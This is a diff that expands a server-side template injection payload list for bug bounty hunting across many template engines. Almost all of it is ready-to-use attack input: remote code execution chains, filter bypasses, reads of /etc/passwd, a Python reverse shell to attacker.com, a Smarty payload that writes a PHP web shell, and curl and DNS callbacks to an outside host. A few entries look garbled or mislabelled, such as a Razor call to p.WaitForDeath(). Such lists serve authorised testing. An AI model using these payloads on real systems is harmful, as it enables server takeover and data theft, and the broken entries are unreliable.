@@ -1,79 +1,390 @@
-# SSTI Payloads
-# Categories: Jinja2, Twig, Freemarker, Velocity, Jade/Pug, Java EL
+# SSTI Payloads — Advanced Bug Bounty Edition
+# Sources: PayloadsAllTheThings, PortSwigger, Tagmachan, Vulnsy, Payload Playground (2025-2026)
+# Categories: Detection, Jinja2, Twig, Freemarker, Velocity, Mako, Tornado, ERB, EJS, Handlebars, Pug, Razor, Go, Pebble, Smarty
 
-# === Generic Detection ===
-{{7*7}}
-${7*7}
-#{7*7}
-*{7*7}
-{{7*'7'}}
-<%= 7*7 %>
+# ============================================================
+# SECTION 1: DETECTION + ENGINE FINGERPRINTING
+# ============================================================
 
-# === Jinja2 (Python/Flask) ===
+# --- Universal polyglot (triggers error in most engines) ---
+${{<%[%'"}}%\
+
+# --- OWASP polyglot reflection test ---
+a{{bar}}b   # if output is "ab" → template engine evaluates {{ }}
+
+# --- Math detection probes ---
+{{7*7}}          # → 49 for Jinja2, Twig, Nunjucks, Pebble, Handlebars
+${7*7}           # → 49 for Freemarker, Groovy, Thymeleaf (SpEL), Velocity
+#{7*7}           # → 49 for Mako, some EL contexts
+<%= 7*7 %>       # → 49 for ERB (Ruby), EJS (Node)
+${{7*7}}         # → 49 for Angular, some custom engines
+{7*7}            # → 49 for Smarty (older), Mustache variants
+${{\"7\"*7}}     # → 49 for Groovy
+@(7*7)           # → 49 for Razor (.NET)
+*{7*7}           # → 49 for Thymeleaf selection expressions
+
+# --- Divergence test (Jinja2 vs Twig) ---
+{{7*'7'}}        # Jinja2 → 7777777 (string repetition)
+                 # Twig → 49 (auto-converts to int)
+
+# --- Decision Tree:
+# {{7*7}} → 49?
+#   YES → {{7*'7'}} = ?
+#     → 7777777 → Jinja2 (Python)
+#     → 49 → Twig (PHP) or Nunjucks (Node.js)
+#   NO → ${7*7} → 49?
+#     YES → Freemarker / Velocity / Groovy (Java)
+#     NO → <%= 7*7 %> → 49?
+#       YES → ERB (Ruby) or EJS (Node.js)
+#       NO → #{7*7} → 49?
+#         YES → Mako (Python)
+#         NO → Possibly Blind SSTI
+
+# ============================================================
+# SECTION 2: JINJA2 (Python — Flask, Django, Ansible)
+# ============================================================
+
+# --- Info Leak ---
 {{7*7}}
-{{7*'7'}}
 {{config}}
+{{config.items()}}
+{{config.__class__.__init__.__globals__}}
 {{request}}
-{{self.__class__.__mro__}}
+{{request.environ}}
+{{self.__dict__}}
+{{self._TemplateReference__context}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+{{lipsum.__globals__}}
+{{cycler.__init__.__globals__}}
+
+# --- RCE via MRO Chain (Python 3) ---
 {{''.__class__.__mro__[1].__subclasses__()}}
-{{''.__class__.__mro__[1].__subclasses__()[X]}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+# Find subprocess.Popen index:
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if c.__name__ == 'Popen' %}{{c('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}
+{% endfor %}
+# Direct (index varies, common: 229, 273, 414, 420, 432, 456):
+{{''.__class__.__mro__[1].__subclasses__()[273]('id',shell=True,stdout=-1).communicate()[0]}}
+
+# --- RCE via os.popen (via globals) ---
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__['os'].popen('id').read()}}
-{% print config %}
-{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x.__init__.__globals__['os'].popen('id').read()}}{% endif %}{% endfor %}
+{{self.__init__.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__['os'].popen('id').read()}}
 
-# === Twig (PHP) ===
+# --- RCE via builtins ---
+{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
+
+# --- File Read ---
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[X]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}}
+
+# --- Filter Bypass (no . or _ ) ---
+{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
+{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')}}
+{{()|attr('__class__')|attr('__mro__')[1]|attr('__subclasses__')()}}
+{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
+
+# --- Filter Bypass (hex encoding) ---
+{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')}}
+{{()|attr('\\x5f\\x5fmro\\x5f\\x5f')}}
+
+# --- Filter Bypass (no brackets, no quotes) ---
+{{config.__class__.__init__.__globals__|dict('os')}}
+{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')}}
+
+# --- Reverse Shell via Python ---
+{% for x in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if x.__name__ == 'Popen' %}
+    {{x('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',shell=True,stdout=-1).communicate()}}
+  {% endif %}
+{% endfor %}
+
+# ============================================================
+# SECTION 3: TWIG (PHP — Symfony, Drupal, Grav)
+# ============================================================
+
+# --- Info Leak ---
 {{7*7}}
+{{_self}}
+{{_self.env}}
+{{app}}
+{{app.request}}
+{{app.request.server.all}}
+{{dump(app)}}
+
+# --- RCE via registerUndefinedFilterCallback ---
 {{_self.env.registerUndefinedFilterCallback("exec")}}
 {{_self.env.getFilter("id")}}
-{{_self.env.setCache("id")}}
-{{_self.env.execute("cat /etc/passwd")}}
 
-# === Smarty (PHP) ===
-{$smarty.version}
-{php}echo shell_exec('id');{/php}
-{system('id')}
+# --- RCE via filter map ---
+{{["id"]|filter("system")}}
+{{["id"]|map("system")|join}}
+{{["id", "0"]|sort("passthru")}}
+{{[0]|reduce("system","id")}}
 
-# === Freemarker (Java) ===
+# --- RCE via setCache / loadTemplate ---
+{{_self.env.setCache("ftp://attacker.com:21/")}}
+{{_self.env.loadTemplate("backdoor")}}
+
+# --- RCE via PHP functions (Twig 2.x) ---
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("cat /etc/passwd")}}
+
+# --- RCE via template_from_string (Twig 3.x with sandbox bypass) ---
+{% set cmd = 'id' %}
+{% set output = '' %}
+{% for x in 0..0 %}
+  {% set output = _self.env.createTemplate('<script>alert(1)</script>') %}
+{% endfor %}
+
+# --- Info via Symfony/Doctrine ---
+{{_self.env.getExtension('Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension')}}
+{{app.request.cookies}}
+{{app.session.all}}
+{{app.user.username}}
+
+# ============================================================
+# SECTION 4: FREEMARKER (Java — Spring, JBoss, Adobe CF)
+# ============================================================
+
+# --- Info Leak ---
 ${7*7}
-${7*'7'}
+${.data_model?keys}
+${.globals?keys}
+${.now}
+
+# --- RCE via Execute class ---
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# --- RCE via ObjectConstructor + ProcessBuilder ---
+<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
+<#assign pb=ob("java.lang.ProcessBuilder",["id"])>
+<#assign is=pb.start().getInputStream()>
+${is?read()}
+
+# --- RCE via Runtime.exec ---
 ${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
 
-# === Velocity (Java) ===
+# --- RCE via ScriptEngine (Java 8+) ---
+<#assign se="javax.script.ScriptEngineManager"?new()>
+${se.getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")}
+
+# --- File Read ---
+${"".getClass().forName("java.io.FileReader").getConstructor("".getClass()).newInstance("/etc/passwd").read()}
+
+# ============================================================
+# SECTION 5: VELOCITY (Java)
+# ============================================================
+
+# --- Info Leak ---
 #set($x=7*7)$x
+
+# --- RCE via Runtime.exec ---
 #set($e="exp")
 #set($c=$e.getClass().forName("java.lang.Runtime"))
 #set($r=$c.getMethod("getRuntime").invoke(null))
 #set($p=$r.exec("id"))
+#set($is=$p.getInputStream())
+#set($sc=1000)
+#set($buf=[])
+#foreach($i in [1..$sc])$buf.add(0)#end
 $p
 
-# === Jade/Pug ===
-#{7*7}
-- var x = 7*7
-= x
+# --- RCE via ClassLoader ---
+#set($c=[])
+#set($c.class.forName("java.lang.Runtime").getRuntime().exec("id"))
 
-# === Java Expression Language (EL) ===
+# ============================================================
+# SECTION 6: MAKO (Python)
+# ============================================================
+
+# --- Info Leak ---
 ${7*7}
-${request}
-${session}
-${applicationScope}
-${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
-${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}
+${self}
+${self.attr}
+${context}
 
-# === Ruby ERB ===
+# --- RCE via module.import ---
+${module.import('os').popen('id').read()}
+
+# --- RCE via __import__ ---
+${__import__('os').popen('id').read()}
+
+# --- RCE via util ---
+${self.util.os.popen('id').read()}
+
+# ============================================================
+# SECTION 7: TORNADO (Python)
+# ============================================================
+
+# --- RCE via handler.settings ---
+{{handler.settings}}
+{% import os %}
+{{os.popen('id').read()}}
+{% module Template("") %}
+
+# ============================================================
+# SECTION 8: ERB (Ruby — Rails)
+# ============================================================
+
+# --- Info Leak ---
 <%= 7*7 %>
+<%= File.read('/etc/passwd') %>
+
+# --- RCE via system() ---
 <%= system("id") %>
 <%= `id` %>
 <%= IO.popen("id").read() %>
+<%= %x(id) %>
 
-# === Golang Template ===
+# --- RCE via eval ---
+<%= eval("system('id')") %>
+<%= `<%="id"%>` %>
+
+# --- RCE via Open3 ---
+<%= require 'open3'; Open3.popen3('id') {|i,o,e,t| o.read } %>
+
+# --- Filter bypass (\x escape) ---
+<%= "\x73\x79\x73\x74\x65\x6d('id')" %>    # system('id') hex-encoded
+<%= eval("sys"+"tem('id')") %>
+
+# ============================================================
+# SECTION 9: EJS / NUNJUCKS (Node.js)
+# ============================================================
+
+# --- EJS Info Leak ---
+<%= 7*7 %>
+<%= JSON.stringify(process.env) %>
+
+# --- EJS RCE ---
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+<%= require('child_process').execSync('id') %>
+<%= process.mainModule.require('child_process').execSync('id') %>
+
+# --- Nunjucks RCE ---
+{{ 7*7 }}
+{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
+
+# ============================================================
+# SECTION 10: HANDLEBARS / MUSTACHE (Node.js)
+# ============================================================
+
+# --- Handlebars RCE ---
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.split "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id')"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.split.apply (string.split "") .)}}
+            {{this.pop}}
+            {{this.push codelist}}
+            {{this.pop}}
+            {{#with (string.split.apply (string.split "") .)}}...{{/with}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# ============================================================
+# SECTION 11: PUG / JADE (Node.js)
+# ============================================================
+
+# --- Pug RCE ---
+#{7*7}
+- var x = global.process.mainModule.require('child_process').execSync('id')
+= x
+
+# --- Pug inline JS ---
+<script>alert(1)</script>
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+
+# ============================================================
+# SECTION 12: RAZOR (.NET / ASP.NET)
+# ============================================================
+
+# --- Info Leak ---
+@(7*7)
+@(Request)
+
+# --- RCE via Process.Start (if fully trusted) ---
+@{
+  var p = System.Diagnostics.Process.Start("cmd.exe","/c whoami");
+  string output = p.StandardOutput.ReadToEnd();
+  p.WaitForDeath();
+}
+@output
+
+# --- File Read ---
+@File.ReadAllText("/etc/passwd")
+
+# ============================================================
+# SECTION 13: GO TEMPLATE (html/template, text/template)
+# ============================================================
+
+# --- Info Leak (limited — Go templates are sandboxed) ---
 {{.}}
 {{printf "%s" "test"}}
 {{if .}}{{else}}{{end}}
 {{range .}}{{.}}{{end}}
+{{.Field}}
 
-# === Blind Detection (time-based) ===
-{% if 1==1 %}{{ config }}{% endif %}
+# ============================================================
+# SECTION 14: PEBBLE (Java)
+# ============================================================
+
+# --- Info Leak ---
+{{7*7}}
+
+# --- RCE via Runtime ---
+{{.class.forName("java.lang.Runtime").getMethod("exec",.class.forName("java.lang.String")).invoke(.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}}
+
+# ============================================================
+# SECTION 15: SMARTY (PHP)
+# ============================================================
+
+# --- Info Leak ---
+{$smarty.version}
+
+# --- RCE via {php} tag ---
+{php}echo shell_exec('id');{/php}
+
+# --- RCE via {system} ---
+{system('id')}
+
+# --- RCE via SmartyObject ---
+{Smarty_Internal_Write_File::writeFile('/var/www/html/shell.php','<?php system($_GET["c"]); ?>')}
+
+# ============================================================
+# SECTION 16: BLIND SSTI (out-of-band detection)
+# ============================================================
+
+# --- Jinja2 OOB ---
+{% if 1==1 %}{{config}}{% endif %}
 {{ ''.__class__.__mro__[1].__subclasses__()[X] }}
 {{ (1+1) }}
+
+# --- Jinja2 DNS callback ---
+{{config.__class__.__init__.__globals__['os'].popen('nslookup burpcollaborator.net').read()}}
+
+# --- Twig DNS callback ---
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("nslookup burpcollaborator.net")}}
+
+# --- Ruby ERB OOB ---
+<%= system("curl http://burpcollaborator.net/ssti") %>
+
+# --- Node.js OOB ---
+<%= global.process.mainModule.require('child_process').execSync('curl http://burpcollaborator.net/ssti') %>
